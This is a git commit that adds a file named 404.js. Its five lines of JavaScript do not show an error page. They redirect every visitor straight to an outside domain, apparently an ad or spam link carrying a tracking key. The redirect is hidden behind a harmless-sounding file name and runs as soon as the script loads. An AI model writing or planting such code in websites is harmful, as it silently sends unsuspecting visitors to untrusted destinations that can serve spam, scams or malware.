628438545cde7b30d6d03bb5ef61ad4ac90b18e4
leswarokojit <84512579+leswarokojit@users.noreply.github.com>
2022-06-21 15:51:30 +0800

    Create 404.js

---
+++ 404.js
@@ -0,0 +1,5 @@
+var dataUrl = [
+  '//engagedpungentrepress.com/i8qigyrv?key=489a4f2de7d0a6399f00397a1ce9becb'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
